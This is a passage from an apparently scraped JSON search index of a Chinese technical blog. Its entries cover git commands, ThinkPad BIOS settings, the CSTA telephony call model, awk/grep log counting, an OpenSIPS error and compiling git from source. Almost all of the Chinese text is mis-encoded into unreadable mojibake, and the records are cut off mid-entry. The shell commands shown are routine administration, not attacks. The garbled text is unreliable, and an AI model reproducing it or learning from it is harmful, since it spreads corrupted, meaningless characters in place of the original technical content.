å»–é›ªå³° gitæ•™ç¨‹ çŒ´å­éƒ½èƒ½æ‡‚çš„GITå…¥é—¨ ","permalink":"https://wdd.js.org/posts/2019/10/gmb0oi/","summary":"å¦‚æœå‘½ä»¤è¡Œå¯ä»¥è§£å†³çš„é—®é¢˜ï¼Œå°±ç»å¯¹ä¸è¦ç”¨GUIå·¥å…·ã€‚å¿«ç‚¹è¯•ç”¨Git bashå§ï¼Œ åˆ«å†ç”¨TortoiseGitäº†ã€‚\n1. å¿…ä¼š8ä¸ªå‘½ä»¤ ä¸‹é¢çš„æ“ä½œéƒ½æ˜¯ç»å¸¸ä½¿ç”¨çš„ï¼Œæœ‰äº›åªéœ€è¦åšä¸€æ¬¡ï¼Œæœ‰äº›æ˜¯ç»å¸¸æ“ä½œçš„\ngitå‘½ä»¤è™½ç„¶å¤šï¼Œä½†æ˜¯ç»å¸¸ä½¿ç”¨çš„ä¸è¶…è¿‡8ä¸ªã€‚\nå‘½ä»¤ æ‰§è¡Œæ¬¡æ•° è¯´æ˜ git clone http://sdfjslf.git æ¯ä¸ªé¡¹ç›®åªéœ€è¦æ‰§è¡Œä¸€æ¬¡ //å…‹éš†ä¸€ä¸ªé¡¹ç›® git fetch origin round-2 æ¯ä¸ªåˆ†æ”¯åªéœ€è¦æ‰§è¡Œä¸€æ¬¡ //round-2åˆ†æ”¯åœ¨æœ¬åœ°ä¸å­˜åœ¨ï¼Œé¦–å…ˆè¦åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ git checkout round-2 å¤šæ¬¡ // åˆ‡æ¢åˆ°round-2åˆ†æ”¯ git branch --set-upstream-to=origin/round-2 æ¯ä¸ªåˆ†æ”¯åªéœ€è¦æ‰§è¡Œä¸€æ¬¡ // å°†æœ¬åœ°round-2åˆ†æ”¯å…³è”è¿œç¨‹round-2åˆ†æ”¯ git add -A æ¯æ¬¡å¢åŠ æ–‡ä»¶éƒ½è¦æ‰§è¡Œ // åœ¨round-2ä¸‹åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶, ä½¿ç”¨-Aå¯ä»¥æ·»åŠ æ‰€æœ‰æ–‡ä»¶åˆ°æš‚å­˜åŒº git commit -am \u0026quot;æˆ‘å¢åŠ äº†ä¸€ä¸ªæ–‡ä»¶\u0026quot; æ¯æ¬¡æäº¤éƒ½è¦æ‰§è¡Œ // commit git push æ¯æ¬¡æ¨é€éƒ½è¦æ‰§è¡Œ //æœ€å¥½æ˜¯åœ¨pushä¹‹å‰ï¼Œä½¿ç”¨git pullæ‹‰å»è¿œç¨‹ä»£ç åˆ°æœ¬åœ°ï¼Œå¦åˆ™æœ‰å¯èƒ½è¢«æ‹’ç» git pull æ¯æ¬¡æ‹‰å»éƒ½è¦æ‰§è¡Œ æ‹‰å»è¿œç¨‹åˆ†æ”¯ä»£ç åˆ°æœ¬åœ°å¹¶åˆå¹¶åˆ°å½“å‰åˆ†æ”¯ 2. å¸¸ç”¨çš„gitå‘½ä»¤ å‡è®¾ä½ åœ¨masteråˆ†æ”¯ä¸Š\n// å°†æœ¬åœ°ä¿®æ”¹åçš„æ–‡ä»¶æ¨é€åˆ°æœ¬åœ°ä»“åº“ git commit -am \u0026#39;ä¿®æ”¹äº†ä¸€ä¸ªé—®é¢˜\u0026#39; // å°†æœ¬åœ°ä»“åº“æ¨é€åˆ°è¿œç¨‹ä»“åº“ git push 2.1. çŠ¶æ€ç®¡ç† 2.","title":"gitbashç”Ÿå­˜æŒ‡å— ä¹‹ gitå¸¸ç”¨å‘½ä»¤ä¸oh-my-zshå¸¸ç”¨ç¼©å†™"},{"content":"å…è´¹äº§å“çš„ç›ˆåˆ©æ¨¡å¼æœ‰å››ç§\næŠ•æ”¾å¹¿å‘Š å¢å€¼æœåŠ¡ï¼šå…ˆæŠŠç¾Šå…»è‚¥ï¼Œå†æ…¢æ…¢å‰²ç¾Šæ¯›ï¼Œç°åœ¨å¤§éƒ¨åˆ†éƒ½æ˜¯äº’è”ç½‘æœåŠ¡éƒ½æ˜¯è¿™ç§ äº¤å‰è¡¥è´´: AæœåŠ¡å…è´¹ï¼Œå†ç”¨æˆ·ä½¿ç”¨AæœåŠ¡æ—¶ï¼Œé€šè¿‡æä¾›BæœåŠ¡æ¥ç›ˆåˆ© é›¶è¾¹é™…æˆæœ¬ï¼šå…è´¹æä¾›AæœåŠ¡ï¼Œä½†æ˜¯ç”¨æˆ·éœ€è¦ç”¨ç‰©å“å»äº¤æ¢AæœåŠ¡ï¼ŒæœåŠ¡æä¾›è€…é€šè¿‡åŠ å·¥ç‰©å“æ¥ç›ˆåˆ© ","permalink":"https://wdd.js.org/posts/2019/10/ce03id/","summary":"å…è´¹äº§å“çš„ç›ˆåˆ©æ¨¡å¼æœ‰å››ç§\næŠ•æ”¾å¹¿å‘Š å¢å€¼æœåŠ¡ï¼šå…ˆæŠŠç¾Šå…»è‚¥ï¼Œå†æ…¢æ…¢å‰²ç¾Šæ¯›ï¼Œç°åœ¨å¤§éƒ¨åˆ†éƒ½æ˜¯äº’è”ç½‘æœåŠ¡éƒ½æ˜¯è¿™ç§ äº¤å‰è¡¥è´´: AæœåŠ¡å…è´¹ï¼Œå†ç”¨æˆ·ä½¿ç”¨AæœåŠ¡æ—¶ï¼Œé€šè¿‡æä¾›BæœåŠ¡æ¥ç›ˆåˆ© é›¶è¾¹é™…æˆæœ¬ï¼šå…è´¹æä¾›AæœåŠ¡ï¼Œä½†æ˜¯ç”¨æˆ·éœ€è¦ç”¨ç‰©å“å»äº¤æ¢AæœåŠ¡ï¼ŒæœåŠ¡æä¾›è€…é€šè¿‡åŠ å·¥ç‰©å“æ¥ç›ˆåˆ© ","title":"å…è´¹æœåŠ¡çš„ç›ˆåˆ©æ¨¡å¼"},{"content":"1. å®éªŒå‡†å¤‡ T450ç¬”è®°æœ¬ 2. è¿›å…¥BIOS é‡å¯ç”µè„‘ ä¸€ç›´ä¸åœæŒ‰enter æŒ‰F1 é€‰æ‹©Keyboard/mouse 3. æ¢å¤F1-F2æ¢å¤åŸå§‹åŠŸèƒ½: fn and ctrl key swapÂ [enabled]\n4. åˆ‡æ¢ctrlå’Œctrlçš„ä½ç½®: F1-F12 as primary functionÂ [enabled]\n5. ä¿å­˜ï¼Œé€€å‡º ","permalink":"https://wdd.js.org/posts/2019/10/qzbgvf/","summary":"1. å®éªŒå‡†å¤‡ T450ç¬”è®°æœ¬ 2. è¿›å…¥BIOS é‡å¯ç”µè„‘ ä¸€ç›´ä¸åœæŒ‰enter æŒ‰F1 é€‰æ‹©Keyboard/mouse 3. æ¢å¤F1-F2æ¢å¤åŸå§‹åŠŸèƒ½: fn and ctrl key swapÂ [enabled]\n4. åˆ‡æ¢ctrlå’Œctrlçš„ä½ç½®: F1-F12 as primary functionÂ [enabled]\n5. ä¿å­˜ï¼Œé€€å‡º ","title":"thinkpad ç³»åˆ—æ¢å¤F1-F12åŸå§‹åŠŸèƒ½ï¼Œåˆ‡æ¢ctrlå’Œfnçš„ä½ç½®"},{"content":"1. å†…å®¹æ¦‚è¦ CSTA åè®®ä¸æ ‡å‡†æ¦‚è¿° CSTA OpenScape è¯­éŸ³æ¶æ„æ¦‚è¿° 2. CSTA åè®®æ ‡å‡† 2.1. ä»€ä¹ˆæ˜¯ CSTA ? CSTAï¼šç”µè„‘æ”¯æŒé€šè®¯ç¨‹åº(Computer Supported TelecommunicationsApplications) åŸºæœ¬çš„å‘¼å«æ¨¡å‹åœ¨ 1992 å»ºç«‹ï¼Œåæ¥éšç€è¡Œä¸šå‘å±•ï¼Œå‘¼å«æ¨¡å‹ä¹Ÿè¢«åŠ å¼ºå’Œæ‰©å±•ï¼Œä¾‹å¦‚æ–°çš„åè®®ç­‰ç­‰ CSTA æ˜¯ä¸€ä¸ªåº”ç”¨å±‚æ¥å£ï¼Œç”¨æ¥ç›‘æ§å‘¼å«ï¼Œè®¾å¤‡å’Œç½‘ç»œ CSTA åˆ›å»ºäº†ä¸€ä¸ªé€šè®¯ç¨‹åºçš„æŠ½è±¡å±‚: CSTA å¹¶ä¸ä¾èµ–ä»»ä½•åº•å±‚çš„ä¿¡ä»¤åè®® E.g.H.323,SIP,Analog,T1,ISDN,etc. CSTA å¹¶ä¸è¦æ±‚ç”¨æˆ·å¿…é¡»ä½¿ç”¨æŸäº›è®¾å¤‡ E.g.intelligentendpoints,low-function/stimulusdevices,SIPSignalingmodels-3PCC vs. Peer/Peer é€‚ç”¨ä¸åŒçš„æ“ä½œæ¨¡å¼ ç¬¬ä¸‰æ–¹å‘¼å«æ§åˆ¶ ä¸€æ–¹å‘¼å«æ§åˆ¶ CSTA çš„è®¾è®¡ç›®æ ‡æ˜¯ä¸ºäº†æé«˜å„ç§ CSTA å®ç°ä¹‹é—´çš„ç§»æ¤æ€§ è§„èŒƒåŒ–å‘¼å«æ¨¡å‹å’Œè¡Œä¸º å®ŒæˆæœåŠ¡ã€äº‹ä»¶å®šä¹‰ è§„èŒƒåŒ–æ ‡å‡† 3. CSTA æ ‡å‡†çš„è¿›åŒ–å² é˜¶æ®µ 1 (å‘å¸ƒäº June â€™92) 40 ç‰¹æ€§, 66 é¡µ (æœåŠ¡å®šä¹‰) ä¸“æ³¨äºå‘¼å«æ§åˆ¶ é˜¶æ®µ 2 (å‘å¸ƒäº Dec. â€™94) 77 ç‰¹æ€§, 145 é¡µ (æœåŠ¡å®šä¹‰) I/O \u0026amp; è¯­éŸ³å•å…ƒæœåŠ¡, æ›´å¤šå‘¼å«æ§åˆ¶æœåŠ¡ é˜¶æ®µ 3 - CSTA Phase II Features \u0026amp; versit CTI Technology å‘å¸ƒäº Dec. â€˜98 136 ç‰¹æ€§, 650 é¡µ (æœåŠ¡å®šä¹‰) ä½œä¸º ISO æ ‡å‡†å‘å¸ƒäº July 2000 å‘å¸ƒ CSTA XML (ECMA-323) June 2004 å‘å¸ƒ â€œUsing CSTA with Voice Browsersâ€ (TR/85) Dec. 02 å‘å¸ƒ CSTA WSDL (ECMA-348) June 2004 June 2004: å‘å¸ƒå¯¹è±¡æ¨¡å‹ TR/88 June 2004: å‘å¸ƒ â€œUsing CSTA for SIP Phone User Agents (uaCSTA)â€ TR/87 June 2004: å‘å¸ƒ â€œApplication Session Servicesâ€ (ECMA-354) June 2005: å‘å¸ƒ â€œWS-Session: WSDL for ECMA-354â€(ECMA-366) December 2005 : å‘å¸ƒ â€œManagement Notification and Computing FunctionServicesâ€ December 2005 : Session Management, Event Notification, Amendements for ECMA-348â€ (TR/90) December 2006 : Published new editions of ECMA-269, ECMA-323, ECMA-348 4. CSTA æ ‡å‡†æ–‡æ¡£ 5. CSTA æ ‡å‡†æ‰©å±• æ–°çš„ç‰¹æ€§å¯ä»¥è¢«åŠ å…¥æ ‡å‡†é€šè¿‡å‘å¸ƒæ–°ç‰ˆæœ¬çš„æ ‡å‡† æ–°çš„å‚æ•°ï¼Œæ–°çš„å€¼å¯ä»¥è¢«åŠ å…¥é€šè¿‡å‘å¸ƒæ–°ç‰ˆæœ¬çš„æ ‡å‡† æœªæ¥çš„æ–°ç‰ˆæœ¬å¿…é¡»ä¸‹å‘åå…¼å®¹ å…·ä½“çš„å®æ–½å¯ä»¥å¢åŠ å±æ€§é€šè¿‡ CSTA è‡ªå¸¦çš„æ‰©å±•æœºåˆ¶(e.g. ONS â€“ One Number Service) 6. CSTA æ“ä½œæ¨¡å‹ CSTA æ“ä½œæ¨¡å‹ç”±è®¡ç®—åŸŸå’Œè½¬æ¢åŸŸç»„æˆï¼Œæ˜¯ CSTA å®šä¹‰åœ¨ä¸¤ä¸ªåŸŸä¹‹é—´çš„æ¥å£ CSTA æ ‡å‡†è§„å®šäº†æ¶ˆæ¯ï¼ˆæœåŠ¡ä»¥åŠäº‹ä»¶ä¸ŠæŠ¥ï¼‰,è¿˜æœ‰ä¸ä¹‹ç›¸å…³çš„è¡Œä¸º è®¡ç®—åŸŸæ˜¯ CSTA ç¨‹åºçš„å®¿ä¸»ç¯å¢ƒï¼Œç”¨æ¥ä¸è½¬æ¢åŸŸäº¤äº’ä¸æ§åˆ¶ è½¬æ¢åŸŸÂ - CSTA æ¨¡å‹æä¾›æŠ½è±¡å±‚ï¼Œç¨‹åºå¯ä»¥è§‚æµ‹å¹¶æ§åˆ¶çš„ã€‚è½¬æ¢æ¸”åŒ…æ‹¬ä¸€äº›å¯¹è±¡ä¾‹å¦‚ CSTA å‘¼å«ï¼Œè®¾å¤‡ï¼Œé“¾æ¥ã€‚ 7. CSTA æ“ä½œæ¨¡å‹ï¼šå‘¼å«ï¼Œè®¾å¤‡ï¼Œé“¾æ¥ ç›¸å…³è¯´æ˜æ˜¯çš„çš„çš„çš„\n8. å‚è€ƒ CSTAoverview CSTA_introduction_and_overview ","permalink":"https://wdd.js.org/opensips/ch1/csta-call-model/","summary":"1. å†…å®¹æ¦‚è¦ CSTA åè®®ä¸æ ‡å‡†æ¦‚è¿° CSTA OpenScape è¯­éŸ³æ¶æ„æ¦‚è¿° 2. CSTA åè®®æ ‡å‡† 2.1. ä»€ä¹ˆæ˜¯ CSTA ? CSTAï¼šç”µè„‘æ”¯æŒé€šè®¯ç¨‹åº(Computer Supported TelecommunicationsApplications) åŸºæœ¬çš„å‘¼å«æ¨¡å‹åœ¨ 1992 å»ºç«‹ï¼Œåæ¥éšç€è¡Œä¸šå‘å±•ï¼Œå‘¼å«æ¨¡å‹ä¹Ÿè¢«åŠ å¼ºå’Œæ‰©å±•ï¼Œä¾‹å¦‚æ–°çš„åè®®ç­‰ç­‰ CSTA æ˜¯ä¸€ä¸ªåº”ç”¨å±‚æ¥å£ï¼Œç”¨æ¥ç›‘æ§å‘¼å«ï¼Œè®¾å¤‡å’Œç½‘ç»œ CSTA åˆ›å»ºäº†ä¸€ä¸ªé€šè®¯ç¨‹åºçš„æŠ½è±¡å±‚: CSTA å¹¶ä¸ä¾èµ–ä»»ä½•åº•å±‚çš„ä¿¡ä»¤åè®® E.g.H.323,SIP,Analog,T1,ISDN,etc. CSTA å¹¶ä¸è¦æ±‚ç”¨æˆ·å¿…é¡»ä½¿ç”¨æŸäº›è®¾å¤‡ E.g.intelligentendpoints,low-function/stimulusdevices,SIPSignalingmodels-3PCC vs. Peer/Peer é€‚ç”¨ä¸åŒçš„æ“ä½œæ¨¡å¼ ç¬¬ä¸‰æ–¹å‘¼å«æ§åˆ¶ ä¸€æ–¹å‘¼å«æ§åˆ¶ CSTA çš„è®¾è®¡ç›®æ ‡æ˜¯ä¸ºäº†æé«˜å„ç§ CSTA å®ç°ä¹‹é—´çš„ç§»æ¤æ€§ è§„èŒƒåŒ–å‘¼å«æ¨¡å‹å’Œè¡Œä¸º å®ŒæˆæœåŠ¡ã€äº‹ä»¶å®šä¹‰ è§„èŒƒåŒ–æ ‡å‡† 3. CSTA æ ‡å‡†çš„è¿›åŒ–å² é˜¶æ®µ 1 (å‘å¸ƒäº June â€™92) 40 ç‰¹æ€§, 66 é¡µ (æœåŠ¡å®šä¹‰) ä¸“æ³¨äºå‘¼å«æ§åˆ¶ é˜¶æ®µ 2 (å‘å¸ƒäº Dec. â€™94) 77 ç‰¹æ€§, 145 é¡µ (æœåŠ¡å®šä¹‰) I/O \u0026amp; è¯­éŸ³å•å…ƒæœåŠ¡, æ›´å¤šå‘¼å«æ§åˆ¶æœåŠ¡ é˜¶æ®µ 3 - CSTA Phase II Features \u0026amp; versit CTI Technology å‘å¸ƒäº Dec.","title":"CSTA å‘¼å«æ¨¡å‹ç®€ä»‹"},{"content":"test.log\n2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;A\u0026#34; loginIn 2019-1010-1920 192.345.23.1 cause:\u0026#34;BBB\u0026#34; type:\u0026#34;A\u0026#34; loginIn 2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;S\u0026#34; loginIn 2019-1010-1920 192.345.23.1 cause:\u0026#34;BBJ\u0026#34; type:\u0026#34;A\u0026#34; loginIn æŒ‰åˆ—åˆ†å‰² æå–ç¬¬ä¸‰åˆ—\næ—¥å¿—åˆ—æ•°æ¯”è¾ƒå°‘æˆ–åˆ™è¦æå–çš„å­—æ®µæ¯”è¾ƒé å‰æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨ awkã€‚å½“ç„¶ cut ä¹Ÿå¯ä»¥åšåˆ°ã€‚\næ¯”å¦‚è¾“å‡ºæ—¥å¿—çš„ç¬¬ä¸‰åˆ—\nawk \u0026#39;{print $3}\u0026#39; test.log // $3è¡¨ç¤ºç¬¬ä¸‰åˆ— cut -d \u0026#34; \u0026#34; -f3 test.log // -f3æŒ‡å®šç¬¬ä¸‰åˆ—, -dç”¨æ¥æŒ‡å®šåˆ†å‰²ç¬¦ æ­£åˆ™æå– æå– cause å­—æ®µçš„åŸå› å€¼ï¼Ÿ\n2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;A\u0026#34; loginIn 2019-1010-1920 192.345.23.1 type:\u0026#34;A\u0026#34; loginIn cause:\u0026#34;BBB\u0026#34; 2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;S\u0026#34; loginIn 2019-1010-1920 192.345.23.1 type:\u0026#34;A\u0026#34; cause:\u0026#34;BBJ\u0026#34; loginIn å½“è¦æå–çš„å†…å®¹ä¸åœ¨åŒä¸€åˆ—æ—¶ï¼Œå¾€å¾€å°±æ— æ³•ç”¨cutæˆ–è€…awkå°±æŒ‰åˆ—æå–ã€‚æœ€å¥½ç”¨çš„æ–¹å¼æ˜¯ç”¨ grep çš„æ­£åˆ™æå–ã€‚\nå¥½åƒ grep ä¸æ”¯æŒæ•è·åˆ†ç»„ï¼Œæ‰€ä»¥åªèƒ½æå–å‡ºå‡º cause:\u0026ldquo;AAA\u0026rdquo;ï¼Œè€Œæ— æ³•ç›´æ¥æå–å‡º AAA\nE è¡¨ç¤ºä½¿ç”¨æ­£åˆ™ o è¡¨ç¤ºåªæ˜¾ç¤ºåŒ¹é…åˆ°çš„å†…å®¹ \u0026gt; grep -Eo \u0026#39;cause:\u0026#34;.*?\u0026#34;\u0026#39; test.log cause:\u0026#34;AAA\u0026#34; cause:\u0026#34;BBB\u0026#34; cause:\u0026#34;AAA\u0026#34; cause:\u0026#34;BBJ\u0026#34; ç»Ÿè®¡ å¯¹è¾“å‡ºçš„å…³é”®è¯è¿›è¡Œç»Ÿè®¡ï¼Œå¹¶æŒ‰ç…§å‡åºæˆ–è€…é™åºæ’åˆ—ã€‚\nå°†å…³é”®è¯æŒ‰ç…§åˆ—æˆ–è€…æŒ‰ç…§æ­£åˆ™æå–å‡ºæ¥ä¹‹åï¼Œé¦–å…ˆè¦è¿›è¡Œsortæ’åº, ç„¶åå†è¿›è¡Œuniqå»é‡ã€‚\nä¸è¿›è¡Œæ’åºå°±ç›´æ¥å»é‡ï¼Œç»Ÿè®¡çš„å€¼å°±ä¸å‡†ç¡®ã€‚å› ä¸º uniq å»é‡åªèƒ½å»é™¤è¿ç»­çš„ç›¸åŒå­—ç¬¦ä¸²ã€‚ä¸æ˜¯è¿ç»­çš„å­—ç¬¦ä¸²ï¼Œåˆ™ä¼šç»Ÿè®¡å¤šæ¬¡ã€‚\nä¸‹é¢ä¾‹å­ï¼šéè¿ç»­çš„ cause:\u0026ldquo;AAA\u0026rdquo;ï¼Œæ²¡æœ‰è¢«åˆå¹¶åœ¨ä¸€èµ·è®¡æ•°\n// bad grep -Eo \u0026#39;cause:\u0026#34;.*?\u0026#34;\u0026#39; test.log | uniq -c 1 cause:\u0026#34;AAA\u0026#34; 1 cause:\u0026#34;BBB\u0026#34; 1 cause:\u0026#34;AAA\u0026#34; 1 cause:\u0026#34;BBJ\u0026#34; // good AAA è¢«æ­£ç¡®ç»Ÿè®¡äº† grep -Eo \u0026#39;cause:\u0026#34;.*?\u0026#34;\u0026#39; test.log | sort | uniq -c 2 cause:\u0026#34;AAA\u0026#34; 1 cause:\u0026#34;BBB\u0026#34; 1 cause:\u0026#34;BBJ\u0026#34; å¯¹ç»Ÿè®¡å€¼æ’åº sort é»˜è®¤çš„æ’åºæ˜¯æŒ‰ç…§å­—å…¸æ’åº, å¯ä»¥ä½¿ç”¨-n å‚æ•°è®©å…¶æŒ‰ç…§æ•°å€¼å¤§å°æ’åºã€‚\nn æŒ‰ç…§æ•°å€¼æ’åº r å–åã€‚sort æŒ‰ç…§æ•°å€¼æ’åºæ˜¯ï¼Œé»˜è®¤æ˜¯å‡åºï¼Œå¦‚æœæƒ³è¦ç»“æœé™åºï¼Œé‚£ä¹ˆéœ€è¦-r -k -k å¯ä»¥æŒ‡å®šæŒ‰ç…§æŸåˆ—çš„æ•°å€¼é¡ºåºæ’åºï¼Œå¦‚-k1,1(æŒ‡å®šç¬¬ä¸€åˆ—)ï¼Œ -k2,2(æŒ‡å®šç¬¬äºŒåˆ—)ã€‚å¦‚æœä¸æŒ‡å®š-k å‚æ•°ï¼Œé‚£ä¹ˆä¸€èˆ¬é»˜è®¤ç¬¬ä¸€åˆ—ã€‚ // å‡åºæ’åº grep -Eo \u0026#39;cause:\u0026#34;.*?\u0026#34;\u0026#39; test.log | sort |uniq -c | sort -n 1 cause:\u0026#34;BBB\u0026#34; 1 cause:\u0026#34;BBJ\u0026#34; 2 cause:\u0026#34;AAA\u0026#34; // é™åºæ’åº grep -Eo \u0026#39;cause:\u0026#34;.*?\u0026#34;\u0026#39; test.log | sort |uniq -c | sort -nr 2 cause:\u0026#34;AAA\u0026#34; 1 cause:\u0026#34;BBJ\u0026#34; 1 cause:\u0026#34;BBB\u0026#34; ","permalink":"https://wdd.js.org/shell/grep-awk-sort/","summary":"test.log\n2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;A\u0026#34; loginIn 2019-1010-1920 192.345.23.1 cause:\u0026#34;BBB\u0026#34; type:\u0026#34;A\u0026#34; loginIn 2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;S\u0026#34; loginIn 2019-1010-1920 192.345.23.1 cause:\u0026#34;BBJ\u0026#34; type:\u0026#34;A\u0026#34; loginIn æŒ‰åˆ—åˆ†å‰² æå–ç¬¬ä¸‰åˆ—\næ—¥å¿—åˆ—æ•°æ¯”è¾ƒå°‘æˆ–åˆ™è¦æå–çš„å­—æ®µæ¯”è¾ƒé å‰æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨ awkã€‚å½“ç„¶ cut ä¹Ÿå¯ä»¥åšåˆ°ã€‚\næ¯”å¦‚è¾“å‡ºæ—¥å¿—çš„ç¬¬ä¸‰åˆ—\nawk \u0026#39;{print $3}\u0026#39; test.log // $3è¡¨ç¤ºç¬¬ä¸‰åˆ— cut -d \u0026#34; \u0026#34; -f3 test.log // -f3æŒ‡å®šç¬¬ä¸‰åˆ—, -dç”¨æ¥æŒ‡å®šåˆ†å‰²ç¬¦ æ­£åˆ™æå– æå– cause å­—æ®µçš„åŸå› å€¼ï¼Ÿ\n2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;A\u0026#34; loginIn 2019-1010-1920 192.345.23.1 type:\u0026#34;A\u0026#34; loginIn cause:\u0026#34;BBB\u0026#34; 2019-1010-1920 192.345.23.3 cause:\u0026#34;AAA\u0026#34; type:\u0026#34;S\u0026#34; loginIn 2019-1010-1920 192.345.23.1 type:\u0026#34;A\u0026#34; cause:\u0026#34;BBJ\u0026#34; loginIn å½“è¦æå–çš„å†…å®¹ä¸åœ¨åŒä¸€åˆ—æ—¶ï¼Œå¾€å¾€å°±æ— æ³•ç”¨cutæˆ–è€…awkå°±æŒ‰åˆ—æå–ã€‚æœ€å¥½ç”¨çš„æ–¹å¼æ˜¯ç”¨ grep çš„æ­£åˆ™æå–ã€‚","title":"awkã€grepã€cutã€sortã€uniqç®€å•å‘½ä»¤ç©è½¬æ—¥å¿—åˆ†æä¸ç»Ÿè®¡"},{"content":"https://winmerge.org/?lang=en\nWinMerge-2.16.4-Setup.exe.zip\n","permalink":"https://wdd.js.org/posts/2019/10/zo8dx2/","summary":"https://winmerge.org/?lang=en\nWinMerge-2.16.4-Setup.exe.zip","title":"windowsä¸Šå…è´¹çš„æ–‡æœ¬å¯¹æ¯”å·¥å…·"},{"content":"route_treeè¡¨ä¸­éœ€è¦å¢åŠ carrier\nid carrier 0 default ","permalink":"https://wdd.js.org/opensips/ch7/without-default-carrier/","summary":"route_treeè¡¨ä¸­éœ€è¦å¢åŠ carrier\nid carrier 0 default ","title":"ERROR:carrierroute:carrier_tree_fixup: default_carrier not found"},{"content":"Step 1:Â Install Required PackagesFirstly we need to make sure that we have installed required packages on your system. Use following command to install required packages before compiling Git source.\n# yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel # yum install gcc perl-ExtUtils-MakeMaker Step 2:Â Uninstall old Git RPMNow remove any prior installation of Git through RPM file or Yum package manager. If your older version is also compiled through source, then skip this step.\n# yum remove git Step 3:Â Download and Compile Git SourceDownload git source code from kernel git or simply use following command to download Git 2.5.3.\n# cd /usr/src # wget https://www.kernel.org/pub/software/scm/git/git-2.5.3.tar.gz # tar xzf git-2.5.3.tar.gz After downloading and extracting Git source code, Use following command to compile source code.\n# cd git-2.5.3 # make prefix=/usr/local/git all # make prefix=/usr/local/git install # echo \u0026#39;pathmunge /usr/local/git/bin/\u0026#39; \u0026gt; /etc/profile.d/git.sh # chmod +x /etc/profile.d/git.sh # source /etc/bashrc Step 4.Â Check Git VersionOn completion of above steps, you have successfully install Git in your system. Use the following command to check the git version\n# git --version git version 2.5.3 I also wanted to add that the \u0026ldquo;Getting Started\u0026rdquo; guide at the GIT website also includes instructions on how to download and compile it yourself:\n","permalink":"https://wdd.js.org/posts/2019/10/gxkb91/","summary":"Step 1:Â Install Required PackagesFirstly we need to make sure that we have installed required packages on your system. Use following command to install required packages before compiling Git source.\n# yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel # yum install gcc perl-ExtUtils-MakeMaker Step 2:Â Uninstall old Git RPMNow remove any prior installation of Git through RPM file or Yum package manager. If your older version is also compiled through source, then skip this step.","title":"æ‰‹å·¥å®‰è£…gitæœ€æ–°ç‰ˆ"},{"content":"æœ‰äº›é¡¹ç›®ï¼Œæ–‡æ¡£å†™çš„ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå¾ˆå¤šåœ°æ–¹éƒ½éœ€è¦æ‘¸ç€çŸ³å¤´è¿‡æ²³ï¼Œåœ¨æ­¤å†™ä¸‹è‡ªå·±çš„ä¸€ç‚¹å¿ƒå¾—ä½“ä¼šã€‚\nåæ‚”è¯ å“ªæ€•æ˜¯æ”¹åŠ¨ä¸€è¡Œä»£ç ï¼Œä¹Ÿè¦åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†æ”¯ã€‚å¦‚æœå‘ç°å‰æ–¹æœ‰æ— æ³•ç»•è¡Œçš„æ•…éšœï¼Œä½ å°†ä¼šåº†å¹¸è‡ªå·±ç»™è‡ªå·±ç•™ä¸‹é€€è·¯ã€‚\nä¸è¦æŠŠè‡ªå·±é€¼åˆ°æ­»è§’ï¼Œæ°¸è¿œç»™è‡ªå·±ç•™ä¸‹ä¸€ä¸ªBè®¡åˆ’ã€‚\nå°ç¢æ­¥ ä¸è¦å¤§æ®µé‡æ„ï¼Œè¦å°æ­¥æ…¢èµ°ã€‚å°½é‡å‡å°‘å‘ç”Ÿé—®é¢˜çš„ç‚¹ã€‚åœ¨ä¸€æœ¬ä¹¦ä¸­æ‰¾é”™åˆ«å­—å¾ˆéš¾ï¼Œä½†æ˜¯åœ¨ä¸€è¡Œæ–‡å­—ä¸­æ‰¾é”™åˆ«å­—å°±éå¸¸å®¹æ˜“äº†ã€‚\nå‹¿çŒœæµ‹ å½“ä½ ä¸çŸ¥é“æŸä¸ªå‡½æ•°å¦‚ä½•ä½¿ç”¨æ—¶ï¼Œä¸è¦å»çŒœæµ‹ï¼Œè€Œåº”è¯¥å»çœ‹å®˜æ–¹æ–‡æ¡£æ˜¯å¦‚ä½•è®²è§£è¿™ä¸ªå‡½æ•°çš„ã€‚\n","permalink":"https://wdd.js.org/posts/2019/10/bl933p/","summary":"æœ‰äº›é¡¹ç›®ï¼Œæ–‡æ¡£å†™çš„ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå¾ˆå¤šåœ°æ–¹éƒ½éœ€è¦æ‘¸ç€çŸ³å¤´è¿‡æ²³ï¼Œåœ¨æ­¤å†™ä¸‹è‡ªå·±çš„ä¸€ç‚¹å¿ƒå¾—ä½“ä¼šã€‚\nåæ‚”è¯ å“ªæ€•æ˜¯æ”¹åŠ¨ä¸€è¡Œä»£ç ï¼Œä¹Ÿè¦åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†æ”¯ã€‚å¦‚æœå‘ç°å‰æ–¹æœ‰æ— æ³•ç»•è¡Œçš„æ•…éšœï¼Œä½ å°†ä¼šåº†å¹¸è‡ªå·±ç»™è‡ªå·±ç•™ä¸‹é€€è·¯ã€‚\nä¸è¦æŠŠè‡ªå·±é€¼åˆ°æ­»è§’ï¼Œæ°¸è¿œç»™è‡ªå·±ç•™ä¸‹ä¸€ä¸ªBè®¡åˆ’ã€‚\nå°ç¢æ­¥ 